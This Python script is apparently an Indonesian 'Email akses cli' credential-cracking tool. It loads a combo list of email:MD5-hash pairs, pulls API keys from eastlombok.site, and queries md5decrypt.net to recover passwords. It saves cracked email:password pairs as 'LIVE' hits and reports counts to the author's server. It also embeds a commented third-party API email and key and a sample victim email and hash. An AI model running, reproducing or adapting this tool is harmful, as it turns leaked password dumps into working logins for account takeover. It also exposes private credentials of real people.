import requests, json, re, os, datetime
from concurrent.futures import ThreadPoolExecutor
from setting.setting import cek_cradintial


red = "\033[31m"
purple = "\033[0;35m"
green = "\033[92m"
yellow = "\033[93m"
cyan = "\033[36m"
close = "\033[0m"
blue = "\033[0;34m"

print('''

 \033[94m                  __  __                __          __ \033[0m
 \033[35m ___  ____ ______/ /_/ /___  ____ ___  / /_  ____  / /__
 / _ \/ __ `/ ___/ __/ / __ \/ __ `__ \/ __ \/ __ \/ //_/\033[0m
\033[94m/  __/ /_/ (__  ) /_/ / /_/ / / / / / / /_/ / /_/ / ,< \033[0m
\033[35m\___/\__,_/____/\__/_/\____/_/ /_/ /_/_.___/\____/_/|_|\033[0m
\n \033[36mEmail akses cli\n Created by:osyi_cozy@eastlombok\033[0m\n''')

########################## dbuging ###############################
# name_file = "empas.txt"
# threads_q = 2
##################################################################

########################## Running ###############################
name_file = input( f"{purple}[?] {cyan}Masukkan nama empas: {close}")
threads_q = 2
##################################################################


########################## file result name ########################
y = str(datetime.datetime.now().year)
mo = str(datetime.datetime.now().month)
d = str(datetime.datetime.now().day)
mi = str(datetime.datetime.now().minute)
s = str(datetime.datetime.now().second)
name_file_temp = str(""+y+"_"+mo+"_"+d+"")

name_crack_file = "result/Crack"+name_file_temp+".txt"
name_n_crack_file = "result/Not_crack"+name_file_temp+".txt"
name_unknown_file = "result/Unknown"+name_file_temp+".txt"

##################################################################

##################### cek token on server ############################
hash_user = ""
callback = cek_cradintial()
if callback["message"] == "invalid credintial":
    exit(f" {purple}[x] {red}Username atau password salah!{close}\n")
elif callback["message"] == "invalid token":
    exit(f" {purple}[x] {red}Token salah!{close}\n")
elif callback["message"] == "something error":
    exit(f' {purple}[x] {red}Something error, try again{close}\n')
elif callback["message"] == "success":
    hash_user = callback["data"].strip()
    pass

def send_hits(hits):
    try:
      settings = {
          "hash_user": hash_user,
          "hits": hits,
          "app": {
              "name": "Md5 Decrypt",
              "version": 2
          }
      }
      headers = {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4371.0 Safari/537.36',
          'Accept': 'application/json',
          'Content-Type': 'application/json'
      }
      url = "https://eastlombok.site/api/hits"
      response_api = requests.patch(
          url, data=json.dumps(settings), headers=headers)
      return response_api.json()["message"]
    except Exception as e:
        return 'something error'


######################################################################


# get empas

list_user = []
def get_file_empas(name_file):
    if os.path.exists(name_file):
        for data in open(name_file, 'r', encoding='utf-8').readlines():
            list_user.append(data.strip())
        if len(list_user) == 0:
            exit('{purple}[!_!] {red}Combo is empty {purple}=> {cyan}[cozy@eastlombok]')
    else:
        exit(" {purple}[x_x] {red}File is not exists {purple}=> {cyan}[cozy@eastlombok]")
get_file_empas(name_file)

# api di eastlombok
list_api = []
def api_hash():
    headers = {
        'Host': 'eastlombok.site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4371.0 Safari/537.36',
    }
    url = "https://eastlombok.site/restApi/getApiHash.php?pilihan=get"
    r = requests.get(url, headers=headers)
    data = r.json()
    for api in data:
        list_api.append(api)
api_hash()
# api ke md5 server
crack_list = []
n_crack_list = []
unknown_list = []
user_count = len(list_user)
hits = 0
def md5_decrypt(empas):
    global list_api, user_count, hits
    print(end=f"\r {purple}[*_*] {green}Empas[{user_count}]{purple}:{green}Crack[{len(crack_list)}]{purple}:{red}Not_crack[{len(n_crack_list)}]{purple}:{yellow}Unknown[{len(unknown_list)}]{close}", flush=True)
    pilihan_api = 0
    email_user = re.split(":|\|", empas)[0]
    string_hash = re.split(":|\|", empas)[1]
    if string_hash != "" or email_user != "":
        while True:
            email = list_api[pilihan_api]['email']
            code = list_api[pilihan_api]['api']
            # email = "warlock100@t-online.de"
            # code = "05285f010f6f331b"
            headers = {
                "Cookie": "SERVERID100399=154011",
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4371.0 Safari/537.36',
            }
            url = f"https://md5decrypt.net/en/Api/api.php?hash={string_hash}&hash_type=md5&email={email}&code={code}"

            r = requests.get(url, headers=headers).text
            if r == "ERROR CODE : 001" or r == "ERROR CODE : 002" or r == "ERROR CODE : 003" or r == "ERROR CODE : 004" or r == "ERROR CODE : 006" or r == "ERROR CODE : 007" or r == "ERROR CODE : 008" or r == "ERROR CODE : 009" or "504 Gateway Time-out" in r:
                pilihan_api += 1
            elif r == "ERROR CODE : 005" or r == "":
                print(f"\r {purple}[DIEE] {red}[{empas}] {purple}=> {cyan}[cozy@eastlombok]")
                n_crack_list.append(empas)
                user_count -= 1
                hits += 1
                if hits == 10:
                    send_hits(hits)
                    hits -= 10
                open(name_n_crack_file, "a").write(empas)
                break
            else:
                empas_mantap = f"{email_user}:{r.strip()}"
                print(
                    f"\r {purple}[LIVE] {green}[{empas_mantap}] {purple}=> {cyan}[cozy@eastlombok]")
                crack_list.append(empas)
                user_count -= 1
                hits += 1
                if hits == 10:
                    send_hits(hits)
                    hits -= 10
                open(name_crack_file, "a").write(empas_mantap)
                break
    else:
        print(
            f"\r {purple}[Unknwon] {yellow}[{empas}] {purple}=> {cyan}[cozy@eastlombok]")
        user_count -= 1
        unknown_list.append(empas)
        open(name_unknown_file, "a").write(empas)

# md5_decrypt("nderby1@verizon.net:ce049e7a16d85387b46aa90d11e4747f")
with ThreadPoolExecutor(max_workers=threads_q) as thread:
    for user in list_user:
        thread.submit(md5_decrypt, user)


send_hits(hits)

print(f" {purple}[^_^] {cyan}Crack finish\n {purple}[^_^] {green}Crack[{len(crack_list)}]\n {purple}[^_^] {red}Not_crack[{len(n_crack_list)}]\n {purple} [^_^]{yellow}Unknown[{len(unknown_list)}]{close}")
